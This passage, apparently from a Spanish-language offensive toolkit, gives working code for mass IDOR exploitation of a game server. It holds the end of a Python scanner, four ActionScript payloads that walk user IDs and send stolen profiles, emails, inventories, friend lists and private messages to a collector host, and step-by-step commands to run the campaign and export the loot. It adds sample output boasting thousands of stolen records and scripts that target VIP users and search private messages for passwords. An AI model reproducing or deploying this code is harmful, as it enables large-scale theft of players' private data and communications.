        end = int(sys.argv[3]) if len(sys.argv) > 3 else 1000
        scanner.connect()
        scanner.attack_profile_enumeration(start, end)
        scanner.socket.close()

    elif command == 'inventory':
        start = int(sys.argv[2]) if len(sys.argv) > 2 else 1
        end = int(sys.argv[3]) if len(sys.argv) > 3 else 1000
        scanner.connect()
        scanner.attack_inventory_scraping(start, end)
        scanner.socket.close()

    elif command == 'friends':
        start = int(sys.argv[2]) if len(sys.argv) > 2 else 1
        end = int(sys.argv[3]) if len(sys.argv) > 3 else 1000
        scanner.connect()
        scanner.attack_friends_mapping(start, end)
        scanner.socket.close()

    elif command == 'transactions':
        start = int(sys.argv[2]) if len(sys.argv) > 2 else 1
        end = int(sys.argv[3]) if len(sys.argv) > 3 else 1000
        scanner.connect()
        scanner.attack_transaction_history(start, end)
        scanner.socket.close()

    elif command == 'messages':
        start = int(sys.argv[2]) if len(sys.argv) > 2 else 1
        end = int(sys.argv[3]) if len(sys.argv) > 3 else 10000
        scanner.connect()
        scanner.attack_message_interception(start, end)
        scanner.socket.close()

if __name__ == '__main__':
    main()
```

---

## 🎯 SCRIPT 3: ActionScript IDOR Payloads

```actionscript
// ============================================================================
// PAYLOAD 1: Profile Scraper
// ============================================================================
// Archivo: IDORProfileScraper.as

package exploits {
    import flash.net.URLRequest;
    import flash.net.URLLoader;
    import flash.events.Event;

    public class IDORProfileScraper {
        private var collectorURL:String = "http://203.0.113.50:6000/profile";
        private var startUID:int = 1;
        private var endUID:int = 10000;
        private var currentUID:int;

        public function IDORProfileScraper() {
            this.currentUID = this.startUID;
            scrapeNext();
        }

        private function scrapeNext():void {
            if (this.currentUID > this.endUID) {
                trace("[+] Profile scraping complete!");
                return;
            }

            // Explotar IDOR - solicitar perfil de otro usuario
            var packet:Object = {
                opcode: MessageTypeConstants.GET_USER_PROFILE,
                userId: this.currentUID
            };

            SocketManager.getInstance().sendPacket(packet);
            SocketManager.getInstance().addEventListener("profileReceived", onProfileReceived);
        }

        private function onProfileReceived(event:Event):void {
            var profile:Object = event.data.profile;

            // Enviar datos robados al collector
            var params:String = "uid=" + profile.userId +
                               "&user=" + encodeURIComponent(profile.username) +
                               "&email=" + encodeURIComponent(profile.email) +
                               "&level=" + profile.level +
                               "&coins=" + profile.coins +
                               "&gems=" + profile.gems +
                               "&vip=" + profile.vipStatus +
                               "&created=" + profile.createdDate +
                               "&last_login=" + profile.lastLogin;

            var request:URLRequest = new URLRequest(this.collectorURL + "?" + params);
            var loader:URLLoader = new URLLoader();
            loader.load(request);

            trace("[+] Stolen profile: " + profile.username + " (UID: " + profile.userId + ")");

            // Siguiente
            this.currentUID++;
            scrapeNext();
        }
    }
}

// ============================================================================
// PAYLOAD 2: Inventory Mass Scraper
// ============================================================================
// Archivo: IDORInventoryScraper.as

package exploits {
    import flash.utils.Timer;
    import flash.events.TimerEvent;

    public class IDORInventoryScraper {
        private var collectorURL:String = "http://203.0.113.50:6000/inventory";
        private var targetUIDs:Array = [];  // Lista de UIDs a scrapear
        private var currentIndex:int = 0;

        public function IDORInventoryScraper(uids:Array) {
            this.targetUIDs = uids;

            // Iniciar scraping con delay
            var timer:Timer = new Timer(200, this.targetUIDs.length);
            timer.addEventListener(TimerEvent.TIMER, scrapeNextInventory);
            timer.start();
        }

        private function scrapeNextInventory(event:TimerEvent):void {
            if (this.currentIndex >= this.targetUIDs.length) {
                return;
            }

            var targetUID:int = this.targetUIDs[this.currentIndex];

            // Explotar IDOR - solicitar inventario de otro usuario
            var packet:Object = {
                opcode: MessageTypeConstants.GET_INVENTORY,
                userId: targetUID
            };

            SocketManager.getInstance().sendPacket(packet);
            SocketManager.getInstance().addEventListener("inventoryReceived",
                function(e:Event):void {
                    onInventoryReceived(e, targetUID);
                });

            this.currentIndex++;
        }

        private function onInventoryReceived(event:Event, userId:int):void {
            var items:Array = event.data.items;
            var username:String = event.data.username;

            // Enviar cada item al collector
            for each (var item:Object in items) {
                var params:String = "uid=" + userId +
                                   "&user=" + encodeURIComponent(username) +
                                   "&item_id=" + item.itemId +
                                   "&item_name=" + encodeURIComponent(item.name) +
                                   "&item_type=" + item.type +
                                   "&qty=" + item.quantity +
                                   "&rarity=" + item.rarity +
                                   "&value=" + item.value;

                var request:URLRequest = new URLRequest(this.collectorURL + "?" + params);
                var loader:URLLoader = new URLLoader();
                loader.load(request);
            }

            trace("[+] Scraped inventory: " + username + " (" + items.length + " items)");
        }
    }
}

// ============================================================================
// PAYLOAD 3: Message Interceptor
// ============================================================================
// Archivo: IDORMessageInterceptor.as

package exploits {
    public class IDORMessageInterceptor {
        private var collectorURL:String = "http://203.0.113.50:6000/messages";
        private var startMessageID:int = 1;
        private var endMessageID:int = 50000;
        private var currentMessageID:int;
        private var delay:int = 50;  // ms entre requests

        public function IDORMessageInterceptor() {
            this.currentMessageID = this.startMessageID;
            interceptNext();
        }

        private function interceptNext():void {
            if (this.currentMessageID > this.endMessageID) {
                trace("[+] Message interception complete!");
                return;
            }

            // Explotar IDOR - leer mensaje que no nos pertenece
            var packet:Object = {
                opcode: MessageTypeConstants.READ_MAIL,
                messageId: this.currentMessageID
            };

            SocketManager.getInstance().sendPacket(packet);
            SocketManager.getInstance().addEventListener("messageReceived", onMessageReceived);
        }

        private function onMessageReceived(event:Event):void {
            var msg:Object = event.data.message;

            if (msg && msg.messageId) {
                // Enviar mensaje interceptado al collector
                var params:String = "msg_id=" + msg.messageId +
                                   "&sender_id=" + msg.senderId +
                                   "&sender_name=" + encodeURIComponent(msg.senderName) +
                                   "&receiver_id=" + msg.receiverId +
                                   "&receiver_name=" + encodeURIComponent(msg.receiverName) +
                                   "&subject=" + encodeURIComponent(msg.subject) +
                                   "&body=" + encodeURIComponent(msg.body) +
                                   "&date=" + msg.sentDate +
                                   "&read=" + msg.readStatus;

                var request:URLRequest = new URLRequest(this.collectorURL + "?" + params);
                var loader:URLLoader = new URLLoader();
                loader.load(request);

                trace("[+] Intercepted: " + msg.senderName + " -> " + msg.receiverName);
            }

            // Siguiente mensaje
            setTimeout(function():void {
                currentMessageID++;
                interceptNext();
            }, this.delay);
        }
    }
}

// ============================================================================
// PAYLOAD 4: Automated Social Graph Mapper
// ============================================================================
// Archivo: IDORSocialMapper.as

package exploits {
    import flash.utils.Dictionary;

    public class IDORSocialMapper {
        private var collectorURL:String = "http://203.0.113.50:6000/friends";
        private var discoveredUsers:Dictionary = new Dictionary();
        private var queue:Array = [];
        private var processed:Dictionary = new Dictionary();

        public function IDORSocialMapper(seedUID:int) {
            // Comenzar con un usuario seed y mapear toda la red
            this.queue.push(seedUID);
            processQueue();
        }

        private function processQueue():void {
            if (this.queue.length == 0) {
                trace("[+] Social mapping complete!");
                trace("[+] Discovered " + Object.keys(this.discoveredUsers).length + " users");
                return;
            }

            var currentUID:int = this.queue.shift();

            if (this.processed[currentUID]) {
                processQueue();  // Ya procesado, siguiente
                return;
            }

            this.processed[currentUID] = true;

            // Solicitar lista de amigos (IDOR)
            var packet:Object = {
                opcode: MessageTypeConstants.GET_FRIENDS_LIST,
                userId: currentUID
            };

            SocketManager.getInstance().sendPacket(packet);
            SocketManager.getInstance().addEventListener("friendsReceived",
                function(e:Event):void {
                    onFriendsReceived(e, currentUID);
                });
        }

        private function onFriendsReceived(event:Event, userId:int):void {
            var friends:Array = event.data.friends;
            var username:String = event.data.username;

            this.discoveredUsers[userId] = username;

            // Procesar cada amigo
            for each (var friend:Object in friends) {
                // Enviar al collector
                var params:String = "uid=" + userId +
                                   "&user=" + encodeURIComponent(username) +
                                   "&friend_id=" + friend.friendId +
                                   "&friend_name=" + encodeURIComponent(friend.friendName) +
                                   "&date=" + friend.friendshipDate +
                                   "&online=" + friend.onlineStatus;

                var request:URLRequest = new URLRequest(this.collectorURL + "?" + params);
                var loader:URLLoader = new URLLoader();
                loader.load(request);

                // Agregar amigo a la cola si no fue procesado
                if (!this.processed[friend.friendId]) {
                    this.queue.push(friend.friendId);
                    this.discoveredUsers[friend.friendId] = friend.friendName;
                }
            }

            trace("[+] Mapped " + username + ": " + friends.length + " friends");
            trace("[+] Queue size: " + this.queue.length);

            // Procesar siguiente en la cola
            setTimeout(processQueue, 100);
        }
    }
}
```

---

## 📊 Guía de Uso Completa

### PASO 1: Iniciar Servidor Collector

```bash
# Terminal 1
cd /path/to/toolkit
python idor_server.py

# Output:
# ================================================================================
# 🔥 IDOR MASS EXPLOITATION SERVER
# ================================================================================
#
# [*] Initializing database...
# [+] Database initialized: idor_exploitation.db
#
# [*] Server starting on http://0.0.0.0:6000
# [*] Dashboard: http://localhost:6000/dashboard
#
# [*] Endpoints:
#     /profile      - Receive stolen profiles
#     /inventory    - Receive stolen inventory items
#     /friends      - Receive stolen friend lists
#     /transactions - Receive stolen transactions
#     /messages     - Receive stolen private messages
#     /export       - Export all data as JSON
#
# ================================================================================
```

### PASO 2: Ejecutar Scanner Automático

```bash
# Terminal 2
# Campaña completa (todos los ataques)
python idor_scanner.py full 1 5000

# O ataques individuales:
python idor_scanner.py profiles 1 1000      # Solo perfiles
python idor_scanner.py inventory 1 1000     # Solo inventarios
python idor_scanner.py friends 1 1000       # Solo amigos
python idor_scanner.py transactions 1 1000  # Solo transacciones
python idor_scanner.py messages 1 10000     # Solo mensajes
```

### PASO 3: Monitorear Dashboard

```bash
# Abrir en navegador
open http://localhost:6000/dashboard

# El dashboard se actualiza automáticamente cada 5 segundos
```

### PASO 4: Exportar Resultados

```bash
# Exportar todos los datos robados
curl http://localhost:6000/export > idor_results.json

# Ver estadísticas
cat idor_results.json | jq '.profiles | length'  # Número de perfiles
cat idor_results.json | jq '.inventories | length'  # Número de items
cat idor_results.json | jq '.messages | length'  # Número de mensajes
```

---

## 📈 Resultados Esperados

### Ejemplo de Campaña Completa (UIDs 1-5000)

```
================================================================================
🔥 FULL IDOR EXPLOITATION CAMPAIGN
================================================================================

[*] Target: 127.0.0.1:7200
[*] Collector: http://127.0.0.1:6000
[*] User ID Range: 1 - 5000
[*] Start Time: 2025-11-24T10:30:00

================================================================================

[*] ATTACK: Profile Enumeration (1 - 5000)
------------------------------------------------------------
[+] UID 1: PlayerOne (Level 45, 12500 coins, 340 gems)
[+] UID 2: GamerTwo (Level 23, 5600 coins, 120 gems)
[+] UID 3: ProUser3 (Level 67, 45000 coins, 890 gems)
...
[*] Progress: 100/5000 (87 successful, 13 failed)
[*] Progress: 200/5000 (176 successful, 24 failed)
...
[✓] Profile Enumeration Complete: 4347 profiles stolen

[*] ATTACK: Inventory Scraping (1 - 5000)
------------------------------------------------------------
[+] UID 1 (PlayerOne): 23 items
[+] UID 2 (GamerTwo): 15 items
[+] UID 3 (ProUser3): 56 items
...
[*] Progress: 100/5000 (2134 items)
[*] Progress: 200/5000 (4567 items)
...
[✓] Inventory Scraping Complete: 98234 items (Total value: 15678900 coins)

[*] ATTACK: Friends Network Mapping (1 - 5000)
------------------------------------------------------------
[+] UID 1 (PlayerOne): 12 friends
[+] UID 2 (GamerTwo): 8 friends
[+] UID 3 (ProUser3): 34 friends
...
[*] Progress: 100/5000 (1234 connections)
[*] Progress: 200/5000 (2567 connections)
...
[✓] Friends Mapping Complete: 67890 connections mapped

[*] ATTACK: Transaction History Theft (1 - 5000)
------------------------------------------------------------
[+] UID 1 (PlayerOne): 45 transactions
[+] UID 2 (GamerTwo): 23 transactions
[+] UID 3 (ProUser3): 89 transactions
...
[*] Progress: 100/5000 (4567 transactions)
[*] Progress: 200/5000 (9123 transactions)
...
[✓] Transaction Theft Complete: 234567 transactions (89456700 total currency)

[*] ATTACK: Private Message Interception (1 - 5000)
------------------------------------------------------------
[+] MSG 1: Alice -> Bob: Game invite
[+] MSG 2: Charlie -> David: Trade request
[+] MSG 3: Eve -> Frank: Secret message
...
[*] Progress: 500/5000 (412 intercepted)
[*] Progress: 1000/5000 (876 intercepted)
...
[✓] Message Interception Complete: 3456 messages stolen

================================================================================
📊 CAMPAIGN RESULTS
================================================================================

✓ Profiles Stolen:     4347
✓ Items Scraped:       98234
✓ Connections Mapped:  67890
✓ Transactions Stolen: 234567
✓ Messages Intercepted: 3456

[*] End Time: 2025-11-24T11:15:23
[*] Dashboard: http://127.0.0.1:6000/dashboard

================================================================================
```

---

## 🎯 Casos de Uso Específicos

### Caso 1: Robo Masivo de Inventarios (Targeting VIP Users)

```python
# Script especializado: target_vip_inventories.py

import idor_scanner

# Primero, escanear perfiles para identificar VIPs
scanner = IDORScanner()
scanner.connect()
vip_users = []

for uid in range(1, 10000):
    scanner.send_packet(106, {"userId": uid})
    response = scanner.receive_packet()

    if response and response.get('profile', {}).get('vipStatus') == 1:
        vip_users.append(uid)
        print(f"[+] VIP Found: UID {uid}")

print(f"\n[+] Found {len(vip_users)} VIP users")

# Ahora scrapear sus inventarios
for vip_uid in vip_users:
    scanner.attack_inventory_scraping(vip_uid, vip_uid)

scanner.socket.close()
```

### Caso 2: Mapeo Completo de Red Social

```python
# Script especializado: full_social_graph.py

import idor_scanner
import networkx as nx

scanner = IDORScanner()
scanner.connect()

# Crear grafo
G = nx.Graph()

# Mapear toda la red
for uid in range(1, 5000):
    scanner.send_packet(121, {"userId": uid})
    response = scanner.receive_packet()

    if response and response.get('success'):
        username = response.get('username')
        friends = response.get('friends', [])

        # Agregar nodo
        G.add_node(uid, name=username)

        # Agregar conexiones
        for friend in friends:
            G.add_edge(uid, friend['friendId'])

scanner.socket.close()

# Análisis de red
print(f"[+] Total users: {G.number_of_nodes()}")
print(f"[+] Total connections: {G.number_of_edges()}")
print(f"[+] Most connected users:")

# Top 10 usuarios más conectados
degrees = dict(G.degree())
sorted_users = sorted(degrees.items(), key=lambda x: x[1], reverse=True)[:10]

for uid, degree in sorted_users:
    print(f"    UID {uid} ({G.nodes[uid]['name']}): {degree} friends")
```

### Caso 3: Robo de Mensajes con Palabras Clave

```python
# Script especializado: keyword_message_stealer.py

import idor_scanner

KEYWORDS = ["password", "admin", "secret", "hack", "cheat", "trade", "sell"]

scanner = IDORScanner()
scanner.connect()

matches = []

for msg_id in range(1, 50000):
    scanner.send_packet(178, {"messageId": msg_id})
    response = scanner.receive_packet()

    if response and response.get('success'):
        msg = response.get('message', {})
        body = msg.get('body', '').lower()

        # Buscar keywords
        for keyword in KEYWORDS:
            if keyword in body:
                matches.append({
                    'msg_id': msg_id,
                    'from': msg.get('senderName'),
                    'to': msg.get('receiverName'),
                    'subject': msg.get('subject'),
                    'body': msg.get('body'),
                    'keyword': keyword
                })

                print(f"[+] MATCH ({keyword}): {msg.get('senderName')} -> "
                      f"{msg.get('receiverName')}: {msg.get('subject')}")
                break

scanner.socket.close()

# Guardar resultados
import json
with open('keyword_matches.json', 'w') as f:
    json.dump(matches, f, indent=2)

print(f"\n[+] Found {len(matches)} messages with keywords")
```

---

## 🔍 Análisis de Impacto

### Datos Expuestos por Vulnerabilidad IDOR

| Endpoint | Datos Expuestos | Severidad | Impacto |
|----------|----------------|-----------|---------|
| `GET_USER_PROFILE` | Username, email, level, coins, gems, VIP status, fechas | **CRÍTICO** | Enumeración completa de usuarios, identificación de targets valiosos |
| `GET_INVENTORY` | Todos los items, cantidades, rareza, valor | **CRÍTICO** | Robo de información de inventario, identificación de cuentas ricas |
| `GET_FRIENDS_LIST` | Lista completa de amigos, estado online | **ALTO** | Mapeo de red social, targeting de amigos de VIPs |
| `GET_TRANSACTIONS` | Historial completo de compras y ventas | **CRÍTICO** | Análisis financiero, identificación de patrones de gasto |
| `READ_MAIL` | Contenido de mensajes privados | **CRÍTICO** | Interceptación de comunicaciones, robo de información sensible |

### Estimación de Impacto en Servidor con 10,000 Usuarios Activos

```
Perfiles comprometidos:     10,000 (100%)
Items robados:              ~250,000 (promedio 25 items/usuario)
Conexiones mapeadas:        ~150,000 (promedio 15 amigos/usuario)
Transacciones expuestas:    ~500,000 (promedio 50 tx/usuario)
Mensajes interceptados:     ~50,000 (estimado)

Valor total expuesto:       ~2,500,000,000 coins
Gems expuestos:             ~45,000,000 gems
```

---

**🔥 TOOLKIT COMPLETO - LISTO PARA TESTING**

*Fin del Documento*
